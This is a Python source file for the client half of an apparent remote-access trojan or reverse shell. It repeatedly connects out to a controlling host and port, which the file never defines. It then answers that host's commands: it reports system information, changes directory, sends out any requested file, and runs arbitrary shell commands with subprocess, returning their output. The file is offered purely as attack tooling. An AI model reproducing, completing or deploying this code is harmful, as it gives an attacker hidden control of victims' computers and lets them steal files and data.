#!/usr/bin/env python
# ---------- LIBRARIES ---------- #
# Global (System)
import time
import socket
import subprocess
import os
import shutil
import sys
from sys import *
from os import remove
import json
import platform
import pathlib


class CommandHandler():
    def connectionCheck(self) -> str:
        return str.encode("connection working")

    def sysinfo(self) -> json:
        try:
            data = {}
            data['platform'] = platform.system()
            data['platform-release'] = platform.release()
            data['platform-version'] = platform.version()
            data['architecture'] = platform.machine()
            data['hostname'] = socket.gethostname()
            data['ip-address'] = socket.gethostbyname(socket.gethostname())
            data['processor'] = platform.processor()
            data = json.dumps(data)
            return data
        except:
            return 'Error Getting Sysinfo'

    def shell(self, command: str, conn: socket.socket):
        if command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
                return str.encode(os.getcwd())
            except:
                return str.encode('Error Changing Directory')
        elif command[:9] == 'download ':
            try:
                file = open(command[9:], 'rb')
                return file.read()
            except IsADirectoryError:
                return b'[-] Cannot Save a Directory'
            except FileNotFoundError:
                return b'[-] File Not Found'
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            return result

class Client(CommandHandler):
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.sock.connect((host, port))
                self.commandHandler()
                self.sock.close()
            except:
                continue

    def commandHandler(self):
        while True:
            data = self.sock.recv(20480)
            print(data)
            if data.decode() == 'connection check':
                self.sock.send(self.connectionCheck())
            elif data.decode() == 'sysinfo':
                data = self.sysinfo()
                self.sock.send(data.encode())
            elif data.decode() == 'shell':
                while True:
                    data = self.sock.recv(20480)
                    print(data)
                    if data.decode() == 'exit':
                        break
                    result = self.shell(data.decode(), self.sock)
                    self.sock.send(result)

def main():
    Client()

if __name__ == '__main__':
    main()